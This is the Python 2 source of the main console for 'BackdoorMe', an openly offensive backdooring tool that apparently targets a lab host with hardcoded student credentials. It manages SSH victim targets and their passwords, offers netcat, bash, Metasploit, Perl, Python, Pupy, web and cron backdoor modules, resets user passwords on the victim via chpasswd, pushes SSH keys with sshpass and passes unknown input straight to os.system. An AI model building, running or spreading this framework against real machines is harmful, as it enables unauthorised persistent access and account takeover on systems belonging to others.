import os
import socket
import subprocess
import target
from colorama import *
from Tkinter import *
import cmd
from start import ascii
from imports import *

GOOD = Fore.GREEN + " + " + Fore.RESET
BAD = Fore.RED + " - " + Fore.RESET
WARN = Fore.YELLOW + " * " + Fore.RESET
INFO = Fore.BLUE + " + " + Fore.RESET
OPEN = Fore.GREEN + "open" + Fore.RESET
CLOSED = Fore.RED + "closed" + Fore.RESET

def fmtcols(mylist, cols):
    lines = ("\t".join(mylist[i:i+cols]) for i in xrange(0,len(mylist),cols))
    return '\n'.join(lines)

class BackdoorMe(cmd.Cmd):
    prompt = Fore.BLUE + ">> " + Fore.RESET

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.enabled_modules = {"poison" : Poison, "cron" : Cron }
        self.enabled_backdoors = {"bash" : Bash, "bash2" : Bash2, "metasploit" : Metasploit, "netcat" : Netcat, "nct" : Netcat_Traditional, "perl" : Perl, "python" : Pyth, "pupy" : Pupy, "web" : Web } 
        self.target_num = 1
        self.port = 22 
        self.targets = {}
        self.curtarget = None
        proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
        self.localIP = proc.stdout.read()
        self.localIP = self.localIP[:-1]
        self.ctrlc = False
        ascii()
        print "Welcome to BackdoorMe, a powerful backdooring utility. Type \"help\" to see the list of available commands."
        print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
        print "Using local IP of %s." % self.localIP
        self.addtarget("10.1.0.2", "student", "target123")

    def do_help(self, args):
        print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
        print "Using local IP of %s." % self.localIP
        print "\nAvailable commands are: "
        print fmtcols(["addtarget", "adds a target", "edittarget", "edit existing target", "open", "opens an SSH connection to the target", "close", "closes an existing SSH connection to target"], 2)
        
    def addtarget(self, hostname, uname, pword):
        t = target.Target(hostname, uname, pword, self.target_num)
        self.targets[self.target_num] = t
        self.target_num += 1
        self.curtarget = t
    def do_addtarget(self, args):
        hostname = raw_input('Target Hostname: ') #victim host
        try:
            socket.inet_aton(hostname)
        except socket.error:
            print BAD + "Invalid IP Address."
            return 
        uname = raw_input('Username: ') #username for the box to be attacked
        pword = raw_input('Password: ') #password for the box to be attacked
        print GOOD + "Target %d Set!" % self.target_num
        self.addtarget(hostname, uname, pword);
    
    def do_edittarget(self, args):
        t = self.get_target(args, connect=False)
        if t == None:
            return
        hostname = raw_input('Target Hostname: ') #victim host
        try:
            socket.inet_aton(hostname)
        except socket.error:
            print BAD + "Invalid IP Address."
            return 
        uname = raw_input('Username: ') #username for the box to be attacked
        pword = raw_input('Password: ') #password for the box to be attacked
        
        t.hostname = hostname
        t.uname = uname
        t.pword = pword
        print(GOOD + "Target edited")


    def do_set(self, args):
        if (len(args.split()) == 0 or args.split()[0] != "target"):
            print(BAD + "Usage is \"set target <target-num>\"")
            return
        t = self.get_target(args, connect=False)
        if t == None:
            return
        self.curtarget = t
        print GOOD + "Current target set to %s" % args.split()[-1]
    
    def open_conn(self,t):
        try: 
            t.conn()
        except:
            print BAD + "Connection failed."
            return
        print GOOD + "Connection established."

    def do_open(self, args):
        t = self.get_target(args)
        if t == None:
            return
    def do_close(self, args):
        t = self.get_target(args)
        if t == None:
            return
        try: 
            t.close()
        except:
            print BAD + "Connection could not be closed."
            return
        print GOOD + "Connection closed."

    def get_target(self, args, connect=True):
        t = self.curtarget
        if ((len(args.split()) == 1 and not args.split()[-1].isdigit()) or len(args.split()) == 0):
            if self.curtarget == None:
                print BAD + "No currently set target. Add a target with 'addtarget'."
                return None
            else:
                print GOOD + "Using current target %d." % t.target_num
        elif not self.target_exists(int(args.split()[-1])):
            print BAD + "No target with that target ID found." 
            return None
        else:
            print GOOD + "Using target %s" % args.split()[-1]
            t = self.targets[int(args.split()[-1])]
        if not t.is_open and connect:
            print BAD + "No SSH connection to target. Attempting to open a connection..."
            self.open_conn(t)
  
        return t

    def target_exists(self, num):
        return (num in self.targets)  
 
    def do_use(self, args):
        t = self.get_target(args)
        if t == None:
            return
        bd = args.split()[0]
        if bd in self.enabled_backdoors.keys():
            self.enabled_backdoors[bd](self).cmdloop()
        else:
            print(BAD + args + " backdoor cannot be found.")

    def do_userAdd(self, args):
        t = self.get_target(args)
        if t == None:
            return
        UserAdd(t, self).cmdloop()
    
    def do_passwd(self, args):
        t = self.get_target(args)
        if t == None:
            return
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return
        username = raw_input(" + Enter the username: ")
        password = raw_input(" + Enter the new password: ")
        self.curtarget.ssh.exec_command("echo '%s:%s | sudo chpasswd" %(username, password))
        print("Changing %s to %s..." % (username, password)) 

    def do_change_ip(self, args):
        newIP = raw_input("Please input the ip you want to use: ")
        try:
            socket.inet_aton(newIP)
            self.localIP = newIP
        except socket.error:
            print BAD + "Invalid IP Address."
            return 
        print(GOOD + "Local IP is now: " + newIP)
    
    def do_change_port(self, args):
        t = self.get_target(args)
        if t == None:
            return
        
        newPort = raw_input("Please enter the port you want to use for future connections: ")
        t.port = newPort;
        print(GOOD + "SSH Port for target is now: " + t.port)
        if (raw_input("Enter y if you'd like to restart the SSH connection with the new port now: ") == 'y'):
            self.do_close(self, args)
            self.do_open(self, args)
        

    def do_private_key(self, args):
        t = self.get_target(args)
        if t == None:
            return
 
        os.system("sshpass -p %s ssh-copy-id %s@%s" % (t.pword, t.uname, t.hostname))
        print GOOD + "Private key copied."
    
    def do_quit(self, args):
        self.quit()
    def do_clear(self, args):
        os.system("clear")
    def do_list(self, args):
        if args == "targets" or len(args) == 0:
            print(GOOD + "Targets: ")
            for num, t in self.targets.iteritems():
                print(" " + (WARN if (num == self.targets.values().index(self.curtarget) + 1) else " * ") + "%s - %s %s:%s - %s" % (num, t.hostname, t.uname, t.pword, (OPEN if (t.is_open) else CLOSED)))
        if args == "modules" or len(args) == 0:
            print(GOOD + "Available modules: ")
            for num, mod in enumerate(sorted(self.enabled_modules.keys())):
                print("  * " + "%s" % (mod))
        if args == "backdoors" or len(args) == 0:
            print(GOOD+ "Available backdoors: ")
            for mod in sorted(self.enabled_backdoors.keys()):
                print("  * " + "%s" % (mod))
        if len(args) != 0 and args != "targets" and args != "backdoors" and args != "modules":
            print(BAD + "Unknown option " + args)
    def preloop(self):
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._hist    = []      ## No history yet
        self._locals  = {}      ## Initialize execution namespace for user
        self._globals = {}
    def do_history(self, args):
        print self._hist
    def do_exit(self, args):
        self.quit()
    def precmd(self, line):
        self._hist += [ line.strip() ]
        self.ctrlc = False
        return line
        
    def default(self, line):       
        try:
            print GOOD + "Executing \"" + line + "\""
            os.system(line)
        except Exception, e:
            print e.__class__, ":", e 
    def cmdloop(self):
        try:
            cmd.Cmd.cmdloop(self)
        except KeyboardInterrupt:
            if not self.ctrlc: 
                self.ctrlc = True
                print("\n" + BAD + "Please run \"quit\" or \"exit\" to exit, or press Ctrl-C again.")
                self.cmdloop()
            else:
                print("")
                self.quit()            
    def do_EOF(self, line):
        print ""
        return True
    def emptyline(self):
        return
    def quit(self):
        print(BAD + "Exiting...")
        exit()
        return

def main():
    BackdoorMe().cmdloop()

if __name__ == "__main__":
    main()


